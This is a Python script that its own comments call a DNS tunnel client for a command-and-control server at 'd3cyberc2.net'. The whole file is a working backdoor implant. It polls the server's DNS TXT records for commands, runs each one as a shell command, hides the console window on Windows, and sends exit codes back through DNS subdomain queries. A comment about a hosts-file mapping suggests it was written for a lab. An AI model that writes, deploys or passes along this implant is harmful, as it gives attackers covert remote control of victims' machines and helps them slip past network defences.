#!/usr/bin/env python3
import socket
import time
import subprocess
import os
from dnslib import DNSRecord, QTYPE

# The domain of the C2 server (this should match your hosts file mapping)
SERVER_DOMAIN = "d3cyberc2.net"

# Use the system resolver (which honors the hosts file) to resolve the server's IP.
try:
    SERVER_IP = socket.gethostbyname(SERVER_DOMAIN)
    print(f"Resolved {SERVER_DOMAIN} to {SERVER_IP}")
except Exception as e:
    print("Failed to resolve server domain:", e)
    exit(1)

# Fully qualified domain for tunneling (ensure a trailing dot)
DOMAIN = f"{SERVER_DOMAIN}."
POLL_INTERVAL = 10  # seconds

def poll_for_command(subdomain):
    """
    Builds and sends a DNS TXT query for the given subdomain under DOMAIN.
    Returns the TXT record data (i.e. the command) from the server.
    """
    qname = f"{subdomain}.{DOMAIN}"
    query = DNSRecord.question(qname, qtype="TXT")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(query.pack(), (SERVER_IP, 53))
        data, _ = sock.recvfrom(4096)
        reply = DNSRecord.parse(data)
        print("Received reply:", reply)
        for answer in reply.rr:
            if answer.rtype == QTYPE.TXT:
                try:
                    if hasattr(answer.rdata, 'strings'):
                        txt_data = b" ".join(answer.rdata.strings).decode()
                    else:
                        txt_data = str(answer.rdata)
                    # Extract the actual command by removing the subdomain prefix
                    if "status: " in txt_data:
                        command = txt_data.replace("status: ", "").strip()
                    else:
                        command = txt_data.strip()  # Default, in case of unexpected format
                    
                    # Strip any extra quotes (Fixing the "ps" issue)
                    command = command.strip('"').strip("'")
                    return command
                except Exception as e:
                    print("Error extracting TXT record:", e)
    except Exception as e:
        print("Error during DNS query:", e)
    finally:
        sock.close()
    return None

def send_return_code(return_code):
    """
    Sends a DNS TXT query with a subdomain formatted as "rc<return_code>".
    Returns the TXT response from the server.
    """
    subdomain = f"rc{return_code}"
    qname = f"{subdomain}.{DOMAIN}"
    query = DNSRecord.question(qname, qtype="TXT")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(query.pack(), (SERVER_IP, 53))
        data, _ = sock.recvfrom(4096)
        reply = DNSRecord.parse(data)
        print("Received return code reply:", reply)
        for answer in reply.rr:
            if answer.rtype == QTYPE.TXT:
                try:
                    if hasattr(answer.rdata, 'strings'):
                        txt_data = b" ".join(answer.rdata.strings).decode()
                    else:
                        txt_data = str(answer.rdata)
                    return txt_data.strip()
                except Exception as e:
                    print("Error extracting return code TXT record:", e)
    except Exception as e:
        print("Error during DNS query for return code:", e)
    finally:
        sock.close()
    return None

def execute_command(command):
    """
    Executes the given command and returns its exit code.
    On Windows, uses subprocess with hidden window flags.
    """
    try:
        print(f"Executing command: {command}")
        if os.name == 'nt':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.run(command, shell=True, startupinfo=si)
        else:
            result = subprocess.run(command, shell=True)
        return result.returncode
    except Exception as e:
        print("Error executing command:", e)
        return -1

def main():
    print(f"Starting DNS Tunnel Client. Polling for commands every {POLL_INTERVAL} seconds...")
    while True:
        # Poll for the command from the "status" subdomain.
        cmd = poll_for_command("status")
        if cmd:
            print(f"Received command: {cmd}")
            ret_code = execute_command(cmd)
            print(f"Command executed with return code: {ret_code}")
            # Send the return code in a DNS query using the "rc" subdomain.
            rc_response = send_return_code(ret_code)
            if rc_response:
                print(f"Return code acknowledgment from server: {rc_response}")
            else:
                print("No return code acknowledgment received.")
        else:
            print("No command received.")
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
